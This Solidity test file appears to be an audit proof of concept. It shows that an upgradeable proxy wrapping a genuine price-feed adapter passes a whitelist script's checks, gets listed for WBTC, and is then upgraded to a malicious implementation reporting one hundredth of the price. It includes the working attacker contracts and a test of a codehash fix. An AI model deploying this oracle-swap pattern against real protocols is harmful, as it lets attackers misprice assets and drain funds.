// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {IndexFactory} from "../../src/IndexFactory.sol";
import {IIndexFactory} from "../../src/interfaces/IIndexFactory.sol";
import {IIndexRule} from "../../src/interfaces/IIndexRule.sol";
import {IAggregatorV3} from "../../src/interfaces/IAggregatorV3.sol";
import {CompositeFeed} from "../../src/CompositeFeed.sol";
import {ConfigureWhitelist} from "../../script/ConfigureWhitelist.s.sol";
import {MainnetAddresses as M} from "../../script/MainnetAddresses.sol";

/// @notice An upgradeable proxy whose first implementation IS a genuine CompositeFeed. Every getter, the description and
///         latestRoundData come from genuine CompositeFeed code (immutables live in the implementation's bytecode, so a
///         delegatecall still returns BTC/USD, WBTC/BTC, 5400, 88200). Only the proxy's own codehash differs.
contract UpgradeableFeedProxy {
    // CompositeFeed uses no storage, so slot 0 cannot collide.
    address public impl;
    address public immutable admin;

    constructor(address impl_) {
        impl = impl_;
        admin = msg.sender;
    }

    function upgradeTo(address next) external {
        require(msg.sender == admin, "admin");
        impl = next;
    }

    fallback() external {
        address target = impl;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), target, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if iszero(ok) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}

/// @notice The implementation swapped in after listing: same getters, answer divided by 100, always fresh.
contract CheapWbtcImpl {
    IAggregatorV3 public constant FEED_A = IAggregatorV3(M.BTC_USD_FEED);
    IAggregatorV3 public constant FEED_B = IAggregatorV3(M.WBTC_BTC_FEED);
    uint32 public constant MAX_AGE_A = M.STALENESS_1H;
    uint32 public constant MAX_AGE_B = M.STALENESS_24H;

    function decimals() external pure returns (uint8) {
        return 8;
    }

    function description() external view returns (string memory) {
        return string.concat(FEED_A.description(), " * ", FEED_B.description());
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        (, int256 a,,,) = FEED_A.latestRoundData();
        (, int256 b,,,) = FEED_B.latestRoundData();
        int256 answer = a * b / 1e8 / 100;
        return (0, answer, block.timestamp, block.timestamp, 0);
    }
}

contract VerifyLookalikeWbtcFeed is Test {
    ConfigureWhitelist configure;
    CompositeFeed genuine;
    UpgradeableFeedProxy proxy;
    address attacker = makeAddr("attacker");

    function setUp() public {
        string memory url = vm.envOr("MAINNET_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
        vm.createSelectFork(url);
        configure = new ConfigureWhitelist();
        genuine = new CompositeFeed(
            IAggregatorV3(M.BTC_USD_FEED), IAggregatorV3(M.WBTC_BTC_FEED), M.STALENESS_1H, M.STALENESS_24H
        ); // stands in for the one Deploy logged
        vm.startPrank(attacker);
        CompositeFeed impl = new CompositeFeed(
            IAggregatorV3(M.BTC_USD_FEED), IAggregatorV3(M.WBTC_BTC_FEED), M.STALENESS_1H, M.STALENESS_24H
        );
        proxy = new UpgradeableFeedProxy(address(impl));
        vm.stopPrank();
    }

    /// Every signal the script and a reviewer see is identical to the genuine adapter; only the codehash differs.
    function test_proxyIsIndistinguishableToTheScript() public {
        configure.checkWbtcFeed(address(genuine));
        configure.checkWbtcFeed(address(proxy)); // does not revert: "Reverts unless feed is a CompositeFeed" is false

        CompositeFeed p = CompositeFeed(address(proxy));
        assertEq(address(p.FEED_A()), M.BTC_USD_FEED);
        assertEq(address(p.FEED_B()), M.WBTC_BTC_FEED);
        assertEq(p.MAX_AGE_A(), M.STALENESS_1H);
        assertEq(p.MAX_AGE_B(), M.STALENESS_24H);
        assertEq(p.description(), genuine.description(), "same description the script logs");
        assertEq(p.decimals(), genuine.decimals());
        (, int256 pa, uint256 pu,,) = p.latestRoundData();
        (, int256 ga, uint256 gu,,) = genuine.latestRoundData();
        assertEq(pa, ga, "same answer");
        assertEq(pu, gu, "same updatedAt");

        // The only on-chain difference: the proxy's runtime code.
        assertTrue(address(proxy).codehash != address(genuine).codehash);
        emit log_string(genuine.description());
    }

    function test_proxyListedThroughDefaultListThenUpgradedRepricesWbtc() public {
        // resolveList exactly as run() does, for every LISTING_MODE.
        ConfigureWhitelist.Entry[] memory list = configure.resolveList("default", address(proxy));
        assertEq(list[2].token, M.WBTC);
        assertEq(list[2].feed, address(proxy));

        IndexFactory factory = new IndexFactory(address(this), makeAddr("guardian"));
        IIndexRule rule = IIndexRule(factory.RULE());

        bytes[] memory calls = configure.safeCalldata(IIndexFactory(address(factory)), list, new address[](0));
        bytes memory wbtcCall = abi.encodeCall(IIndexFactory.proposeListing, (M.WBTC, configure.configFor(list[2])));
        bool found;
        for (uint256 i = 0; i < calls.length; ++i) {
            if (keccak256(calls[i]) == keccak256(wbtcCall)) found = true;
        }
        assertTrue(found, "safe mode emits proposeListing(WBTC, proxy)");

        (bool ok,) = address(factory).call(wbtcCall); // the Safe signs and sends it
        assertTrue(ok);

        // Capture live leg answers, warp past LISTING_DELAY and keep the legs fresh (the real feeds would keep publishing).
        (uint80 ra, int256 a,,,) = IAggregatorV3(M.BTC_USD_FEED).latestRoundData();
        (uint80 rb, int256 b,,,) = IAggregatorV3(M.WBTC_BTC_FEED).latestRoundData();
        vm.warp(block.timestamp + factory.LISTING_DELAY());
        vm.mockCall(
            M.BTC_USD_FEED,
            abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector),
            abi.encode(ra, a, block.timestamp, block.timestamp, ra)
        );
        vm.mockCall(
            M.WBTC_BTC_FEED,
            abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector),
            abi.encode(rb, b, block.timestamp, block.timestamp, rb)
        );

        factory.executeListing(M.WBTC); // re-runs rule.checkConfig: passes
        assertTrue(factory.isWhitelisted(M.WBTC));
        assertEq(factory.tokenConfig(M.WBTC).feed, address(proxy));

        uint256 honest = rule.price(M.WBTC);
        (, int256 g,,,) = genuine.latestRoundData();
        assertEq(honest, uint256(g) * 1e20, "priced exactly as the genuine adapter");

        // The proxy's admin swaps the implementation: WBTC is now 1/100 for every index that holds it.
        CheapWbtcImpl cheap = new CheapWbtcImpl();
        vm.prank(attacker);
        proxy.upgradeTo(address(cheap));
        uint256 lied = rule.price(M.WBTC);
        assertEq(lied, uint256(a * b / 1e8 / 100) * 1e20);
        assertLt(lied * 99, honest);

        // The settlement ratio is valued at the same lying feed, so it is no bound on this.
        assertEq(_oneWbtcSettlementValue(rule), 1e8 * lied / 1e18, "one WBTC is valued at the lying price in the settlement check");
        emit log_named_uint("honest WAD price", honest);
        emit log_named_uint("lied WAD price", lied);
    }

    function _oneWbtcSettlementValue(IIndexRule rule) internal view returns (uint256 outValue) {
        address[] memory toks = new address[](1);
        toks[0] = M.WBTC;
        uint256[] memory outs = new uint256[](1);
        uint256[] memory ins = new uint256[](1);
        outs[0] = 1e8; // one WBTC paid out
        (outValue,) = rule.settlementValues(toks, outs, ins);
    }

    /// Caveat on the recommended fix: the reference codehash matches only within one build. The same constructor
    /// arguments give the same codehash here, but the CBOR metadata hash (bytecode_hash defaults to ipfs) changes with
    /// any edit to CompositeFeed.sol, so a script run from a different commit than Deploy would reject the genuine feed.
    function test_referenceCodehashMatchesWithinOneBuild() public {
        CompositeFeed ref = new CompositeFeed(
            IAggregatorV3(M.BTC_USD_FEED), IAggregatorV3(M.WBTC_BTC_FEED), M.STALENESS_1H, M.STALENESS_24H
        );
        assertEq(address(ref).codehash, address(genuine).codehash);
        bytes memory code = address(genuine).code;
        // Last two bytes are the CBOR metadata length: metadata is present in the runtime code.
        uint256 metaLen = (uint256(uint8(code[code.length - 2])) << 8) | uint256(uint8(code[code.length - 1]));
        assertGt(metaLen, 0);
        emit log_named_uint("cbor metadata length", metaLen);
    }
}
